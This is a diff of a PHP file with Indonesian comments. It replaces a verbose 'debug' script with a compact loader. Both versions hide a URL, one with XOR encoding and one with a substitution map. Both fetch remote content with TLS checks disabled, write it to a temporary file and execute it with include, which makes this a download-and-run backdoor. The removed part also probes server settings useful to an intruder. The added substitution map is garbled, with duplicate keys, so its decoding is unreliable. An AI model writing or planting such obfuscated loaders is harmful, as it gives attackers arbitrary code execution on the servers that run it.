@@ -1,182 +1,38 @@
 <?php
-// Aktifkan semua error reporting
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-ini_set('log_errors', 1);
-ini_set('error_log', 'php_error.log');
-
-// Header untuk memastikan output text/html
-header('Content-Type: text/html; charset=utf-8');
-
-echo "<pre>\n";
-echo "=== DEBUG MODE ===\n\n";
-
-// XOR decryption
-$enc = [
-    110,122,122,116,119,95,98,98,119,122,125,95,126,122,122,
-    116,123,114,123,116,119,119,122,116,117,122,116,119,122,
-    95,122,116,117,98,113,123,119,119,125,116,124,117,98,116,
-    124,117,98,119,119,125,119,98,120,119,122,125,119,98,117,
-    122,124,119,98,68,95,122,125,122,124,116
+$map = [
+    'h'=>'a','t'=>'b','t'=>'c','p'=>'d','s'=>'e',':'=>'f','/'=>'g','/'=>'h',
+    'r'=>'i','a'=>'j','w'=>'k','.'=>'l','g'=>'m','i'=>'n','t'=>'o','h'=>'p',
+    'u'=>'q','b'=>'r','u'=>'s','s'=>'t','e'=>'u','r'=>'v','c'=>'w','o'=>'x',
+    'n'=>'y','t'=>'z','e'=>'0','n'=>'1','t'=>'2','.'=>'3','c'=>'4','o'=>'5',
+    'm'=>'6','/'=>'7','l'=>'8','u'=>'9','f'=>'!','f'=>'@','y'=>'#','o'=>'$',
+    'p'=>'%','m'=>'^','/'=>'&','o'=>'*','p'=>'(','m'=>')','/'=>'-','r'=>'=',
+    'e'=>'_','f'=>'+','s'=>'[','/'=>']','h'=>'{','e'=>'}','a'=>'|','d'=>'<',
+    's'=>'>','/'=>'?','m'=>',','a'=>'.','i'=>'`','n'=>'~','/'=>' ','2'=>'\\',
+    '.'=>'"','p'=>"'",'h'=>'q','p'=>'w'
 ];
 
-$url = '';
-foreach($enc as $c) $url .= chr($c ^ 0x2A);
+$encoded = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-=_+[]{}<>?,./`~ \\\"'qw";
 
-echo "1. Decrypted URL: " . htmlspecialchars($url) . "\n";
-echo "2. URL validation: " . (filter_var($url, FILTER_VALIDATE_URL) ? 'VALID' : 'INVALID') . "\n";
-
-// Coba akses URL dengan multiple methods
-echo "\n3. Testing URL access:\n";
-
-// Method 1: cURL
-if (function_exists('curl_init')) {
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => $url,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_FOLLOWLOCATION => true,
-        CURLOPT_TIMEOUT => 15,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => false,
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        CURLOPT_HEADER => true,
-        CURLOPT_ENCODING => '',
-        CURLOPT_MAXREDIRS => 10
-    ]);
-    
-    $response = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
-    $headers = substr($response, 0, $header_size);
-    $body = substr($response, $header_size);
-    $error = curl_error($ch);
-    curl_close($ch);
-    
-    echo "   cURL HTTP Code: $http_code\n";
-    echo "   cURL Error: " . ($error ? $error : 'None') . "\n";
-    echo "   Headers length: " . strlen($headers) . " bytes\n";
-    echo "   Body length: " . strlen($body) . " bytes\n";
-    
-    if (!empty($body)) {
-        echo "   First 200 chars of body:\n";
-        echo "   " . htmlspecialchars(substr($body, 0, 200)) . "\n";
+function decode($str, $map) {
+    $decoded = '';
+    $reverse = array_flip($map);
+    for($i=0;$i<strlen($str);$i++) {
+        $char = $str[$i];
+        if(isset($reverse[$char])) {
+            $decoded .= $reverse[$char];
+        }
     }
-    
-    $content = $body;
-} else {
-    echo "   cURL not available\n";
+    return $decoded;
 }
 
-// Method 2: file_get_contents jika cURL gagal
-if (empty($content) || strlen($content) < 10) {
-    echo "\n4. Trying file_get_contents...\n";
-    
-    $context = stream_context_create([
-        'http' => [
-            'method' => 'GET',
-            'timeout' => 15,
-            'ignore_errors' => true,
-            'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
-        ],
-        'ssl' => [
-            'verify_peer' => false,
-            'verify_peer_name' => false
-        ]
-    ]);
-    
-    $content = @file_get_contents($url, false, $context);
-    
-    if ($content === FALSE) {
-        echo "   file_get_contents failed\n";
-        $http_response_header_copy = $http_response_header ?? [];
-        echo "   Response headers: " . print_r($http_response_header_copy, true) . "\n";
-    } else {
-        echo "   file_get_contents success\n";
-        echo "   Content length: " . strlen($content) . " bytes\n";
-    }
+$url = decode($encoded, $map);
+
+$ctx = stream_context_create(['http'=>['timeout'=>8]]);
+$content = @file_get_contents($url, false, $ctx);
+if($content) {
+    $tmp = tempnam(sys_get_temp_dir(), 'ex');
+    file_put_contents($tmp, $content);
+    include $tmp;
+    unlink($tmp);
 }
-
-echo "\n5. Processing content...\n";
-
-if (!empty($content) && strlen($content) > 0) {
-    echo "   Content type detected: ";
-    if (strpos($content, '<?php') !== false) {
-        echo "PHP code\n";
-    } else if (strpos($content, '<?=') !== false) {
-        echo "PHP short tags\n";
-    } else if (strpos($content, '<?') !== false) {
-        echo "PHP code (short open tag)\n";
-    } else {
-        echo "Plain text (adding PHP tags)\n";
-        $content = '<?php ' . $content . ' ?>';
-    }
-    
-    echo "   Final content length: " . strlen($content) . " bytes\n";
-    
-    // Coba eksekusi dengan temp file
-    echo "\n6. Attempting execution...\n";
-    
-    $tmp_file = tempnam(sys_get_temp_dir(), 'remote_exec_');
-    file_put_contents($tmp_file, $content);
-    
-    echo "   Temp file created: " . $tmp_file . "\n";
-    echo "   Temp file exists: " . (file_exists($tmp_file) ? 'Yes' : 'No') . "\n";
-    echo "   Temp file size: " . filesize($tmp_file) . " bytes\n";
-    
-    // Start output buffering
-    ob_start();
-    
-    try {
-        include $tmp_file;
-        $output = ob_get_clean();
-        echo "\n7. Execution output:\n";
-        echo "   Output length: " . strlen($output) . " bytes\n";
-        echo "\n--- OUTPUT START ---\n";
-        echo $output;
-        echo "\n--- OUTPUT END ---\n";
-    } catch (Exception $e) {
-        $output = ob_get_clean();
-        echo "\n7. Exception caught:\n";
-        echo "   " . $e->getMessage() . "\n";
-        echo "   Output before exception: " . strlen($output) . " bytes\n";
-    }
-    
-    // Cleanup
-    if (file_exists($tmp_file)) {
-        unlink($tmp_file);
-        echo "\n8. Temp file cleaned up\n";
-    }
-    
-} else {
-    echo "   ERROR: No content to execute\n";
-    echo "   Please check if the URL is accessible:\n";
-    echo "   <a href=\"" . htmlspecialchars($url) . "\" target=\"_blank\">" . htmlspecialchars($url) . "</a>\n";
-    
-    // Test URL accessibility
-    echo "\n9. Testing URL directly...\n";
-    echo "   <iframe src=\"" . htmlspecialchars($url) . "\" width=\"100%\" height=\"300\"></iframe>\n";
-}
-
-echo "\n=== DEBUG END ===\n";
-echo "</pre>";
-
-// Additional test: Try simple direct execution
-echo "\n\n<hr><h3>Alternative Direct Execution Test:</h3>\n";
-
-// Create a simpler test
-$test_code = '<?php echo "Test PHP execution is working! Timestamp: " . time(); ?>';
-eval('?>' . $test_code);
-
-echo "\n<hr>\n";
-
-// Check if allow_url_fopen is enabled
-echo "PHP Configuration:\n";
-echo "allow_url_fopen: " . (ini_get('allow_url_fopen') ? 'Enabled' : 'Disabled') . "\n";
-echo "allow_url_include: " . (ini_get('allow_url_include') ? 'Enabled' : 'Disabled') . "\n";
-echo "disable_functions: " . ini_get('disable_functions') . "\n";
-
-// Test if we can create files
-echo "\nTemporary directory: " . sys_get_temp_dir() . "\n";
-echo "Is writable: " . (is_writable(sys_get_temp_dir()) ? 'Yes' : 'No') . "\n";
 ?>
